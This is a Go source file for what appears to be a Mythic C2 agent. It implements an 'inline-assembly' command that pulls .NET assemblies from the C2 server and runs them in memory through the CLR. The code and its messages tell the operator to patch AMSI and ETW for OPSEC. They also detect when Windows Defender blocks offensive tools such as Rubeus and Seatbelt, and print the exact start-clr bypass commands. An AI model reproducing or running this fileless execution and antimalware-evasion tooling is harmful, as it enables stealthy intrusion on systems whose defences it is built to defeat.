//go:build windows
// +build windows

// Package commands provides the inline-assembly command for executing .NET assemblies in memory.
//
// This command allows operators to execute .NET assemblies directly from Mythic's file storage
// without writing them to disk. It uses the go-clr library to load assemblies into the CLR
// and execute them in the current process.
//
// Workflow:
//  1. Operator uploads a .NET assembly to Mythic (can be done via the Files page)
//  2. Operator selects the assembly from Mythic's file storage in the command modal
//  3. Operator provides command-line arguments (optional)
//  4. Agent retrieves the assembly from Mythic in chunks
//  5. Agent loads the CLR (if not already loaded)
//  6. Agent executes the assembly in memory with the provided arguments
//  7. Agent captures and returns STDOUT/STDERR output
//
// Security considerations:
//   - Run 'start-clr' and patch AMSI before executing assemblies for better OPSEC
//   - Assemblies execute in the agent's process context
//   - All users with access to Mythic can access uploaded assemblies
//
// Assembly requirements:
//   - Must be a valid .NET Framework assembly (not .NET Core/.NET 5+)
//   - Must have a standard Main() entry point signature
//   - Should be compiled for AnyCPU or the target architecture
//   - External dependencies must be in the GAC or loaded separately
package commands

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"runtime"
	"strings"
	"sync"
	"time"

	"fawkes/pkg/structs"

	"github.com/Ne0nd0g/go-clr"
)

var (
	assemblyMutex sync.Mutex
	runtimeHost   *clr.ICORRuntimeHost
	clrStarted    bool
	amsiPatched   bool // tracks whether AMSI was patched via start-clr
)

// InlineAssemblyCommand implements the inline-assembly command
type InlineAssemblyCommand struct{}

// Name returns the command name
func (c *InlineAssemblyCommand) Name() string {
	return "inline-assembly"
}

// Description returns the command description
func (c *InlineAssemblyCommand) Description() string {
	return "Execute a .NET assembly in memory from Mythic file storage"
}

// InlineAssemblyParams represents the parameters for inline-assembly
type InlineAssemblyParams struct {
	AssemblyB64 string `json:"assembly_b64"` // Base64-encoded assembly bytes
	Arguments   string `json:"arguments"`
}

// Execute executes the inline-assembly command
func (c *InlineAssemblyCommand) Execute(task structs.Task) structs.CommandResult {
	// Ensure we're on Windows
	if runtime.GOOS != "windows" {
		return structs.CommandResult{
			Output:    "Error: This command is only supported on Windows",
			Status:    "error",
			Completed: true,
		}
	}

	// Parse parameters
	var params InlineAssemblyParams
	err := json.Unmarshal([]byte(task.Params), &params)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error parsing parameters: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Validate assembly_b64
	if params.AssemblyB64 == "" {
		return structs.CommandResult{
			Output:    "Error: No assembly data provided",
			Status:    "error",
			Completed: true,
		}
	}

	// Decode the base64-encoded assembly
	assemblyBytes, err := base64.StdEncoding.DecodeString(params.AssemblyB64)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error decoding assembly: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	if len(assemblyBytes) == 0 {
		return structs.CommandResult{
			Output:    "Error: Assembly data is empty",
			Status:    "error",
			Completed: true,
		}
	}

	// Parse arguments string into array
	var args []string
	if params.Arguments != "" {
		// Simple space-based splitting - doesn't handle quotes properly but good enough for most cases
		args = strings.Fields(params.Arguments)
	}

	// Build output string (no intermediate channel sends to avoid jumbled output)
	var output strings.Builder
	output.WriteString(fmt.Sprintf("[*] Received assembly: %d bytes\n", len(assemblyBytes)))
	if params.Arguments != "" {
		output.WriteString(fmt.Sprintf("[*] Arguments: %s\n", params.Arguments))
	}

	// Ensure CLR is started (Merlin approach: keep persistent runtime host)
	// Lock only during CLR initialization
	assemblyMutex.Lock()
	if !clrStarted {
		output.WriteString("[*] Starting CLR v4...\n")

		// Redirect STDOUT/STDERR once when starting CLR
		err = clr.RedirectStdoutStderr()
		if err != nil {
			output.WriteString(fmt.Sprintf("Warning: Could not redirect output: %v\n", err))
		}

		// Retry LoadCLR up to 3 times — go-clr's GetInterface call sometimes
		// returns a spurious "file not found" error on first invocation
		var loadErr error
		for attempt := 1; attempt <= 3; attempt++ {
			runtimeHost, loadErr = clr.LoadCLR("v4")
			if loadErr == nil {
				break
			}
			if strings.Contains(loadErr.Error(), "cannot find the file") {
				output.WriteString(fmt.Sprintf("[*] CLR load attempt %d: transient error, retrying...\n", attempt))
				time.Sleep(500 * time.Millisecond)
				continue
			}
			break
		}
		if loadErr != nil {
			assemblyMutex.Unlock()
			output.WriteString(fmt.Sprintf("[!] Error loading CLR: %v\n", loadErr))
			return structs.CommandResult{
				Output:    output.String(),
				Status:    "error",
				Completed: true,
			}
		}
		clrStarted = true
		output.WriteString("[+] CLR started successfully\n")
		output.WriteString("[!] WARNING: CLR auto-started without AMSI patching.\n")
		output.WriteString("[!] Offensive assemblies may be blocked by Windows Defender.\n")
		output.WriteString("[!] For best results, run 'start-clr' with Autopatch first.\n")
	}
	assemblyMutex.Unlock()

	// Step 1: Load the assembly (Merlin approach)
	output.WriteString("[*] Loading assembly into CLR...\n")

	var methodInfo *clr.MethodInfo
	var loadErr error

	// Lock only during LoadAssembly call
	assemblyMutex.Lock()
	func() {
		defer func() {
			if r := recover(); r != nil {
				loadErr = fmt.Errorf("PANIC during LoadAssembly: %v", r)
			}
		}()

		methodInfo, loadErr = clr.LoadAssembly(runtimeHost, assemblyBytes)
	}()
	assemblyMutex.Unlock()

	if loadErr != nil {
		output.WriteString("\n=== LOAD ERROR ===\n")
		output.WriteString(fmt.Sprintf("%v\n\n", loadErr))

		// Check for AMSI-blocked indicator: HRESULT 0x8007000b (COR_E_BADIMAGEFORMAT)
		// AMSI hooks Assembly.Load() and returns BadImageFormatException when it detects
		// known offensive tools (Seatbelt, Rubeus, SharpUp, etc.)
		if strings.Contains(loadErr.Error(), "0x8007000b") && !amsiPatched {
			output.WriteString("*** LIKELY CAUSE: AMSI is blocking this assembly ***\n")
			output.WriteString("AMSI (Anti-Malware Scan Interface) scans assemblies during CLR loading.\n")
			output.WriteString("Well-known offensive tools are flagged and blocked with 0x8007000b.\n\n")
			output.WriteString("FIX: Run 'start-clr' with AMSI patch BEFORE loading assemblies:\n")
			output.WriteString("  start-clr {\"amsi_patch\": \"Autopatch\", \"etw_patch\": \"Autopatch\"}\n")
			output.WriteString("  OR\n")
			output.WriteString("  start-clr {\"amsi_patch\": \"Hardware Breakpoint\", \"etw_patch\": \"Hardware Breakpoint\"}\n\n")
		}

		output.WriteString("Troubleshooting tips:\n")
		if !amsiPatched {
			output.WriteString("  - Run 'start-clr' with AMSI Autopatch or Hardware Breakpoint before executing assemblies\n")
		}
		output.WriteString("  - Ensure the assembly is a valid .NET Framework executable (.exe)\n")
		output.WriteString("  - Ensure it targets .NET Framework 4.x (not .NET Core/.NET 5+)\n")
		output.WriteString("  - Check that the assembly has a valid Main() entry point\n")
		output.WriteString("  - Verify the assembly is not corrupted\n")
		output.WriteString(fmt.Sprintf("  - Assembly size: %d bytes\n", len(assemblyBytes)))

		return structs.CommandResult{
			Output:    output.String(),
			Status:    "error",
			Completed: true,
		}
	}

	output.WriteString("[+] Assembly loaded successfully\n")

	// Step 2: Invoke the assembly (Merlin approach)
	output.WriteString(fmt.Sprintf("[*] Invoking assembly with %d argument(s)...\n", len(args)))

	var stdout, stderr string
	var invokeErr error

	// Lock only during InvokeAssembly call
	assemblyMutex.Lock()
	func() {
		defer func() {
			if r := recover(); r != nil {
				invokeErr = fmt.Errorf("PANIC during InvokeAssembly: %v", r)
			}
		}()

		stdout, stderr = clr.InvokeAssembly(methodInfo, args)
	}()
	assemblyMutex.Unlock()

	if invokeErr != nil {
		output.WriteString("\n=== INVOKE ERROR ===\n")
		output.WriteString(fmt.Sprintf("%v\n\n", invokeErr))
		output.WriteString("Troubleshooting tips:\n")
		output.WriteString("  - Check that Main() signature is: static void Main(string[] args) or static int Main(string[] args)\n")
		output.WriteString("  - Verify no external dependencies are required\n")
		output.WriteString("  - Try running the assembly at command line first\n")

		return structs.CommandResult{
			Output:    output.String(),
			Status:    "error",
			Completed: true,
		}
	}

	output.WriteString("[+] Assembly executed successfully\n")

	// Add assembly output
	if stdout != "" {
		output.WriteString("\n=== STDOUT ===\n")
		output.WriteString(stdout)
		if !strings.HasSuffix(stdout, "\n") {
			output.WriteString("\n")
		}
	}

	// Only show STDERR if there's an actual error message (not just CLR noise)
	if stderr != "" && !strings.Contains(stderr, "The system cannot find the file specified") {
		output.WriteString("\n=== STDERR ===\n")
		output.WriteString(stderr)
		if !strings.HasSuffix(stderr, "\n") {
			output.WriteString("\n")
		}
	}

	return structs.CommandResult{
		Output:    output.String(),
		Status:    "completed",
		Completed: true,
	}
}
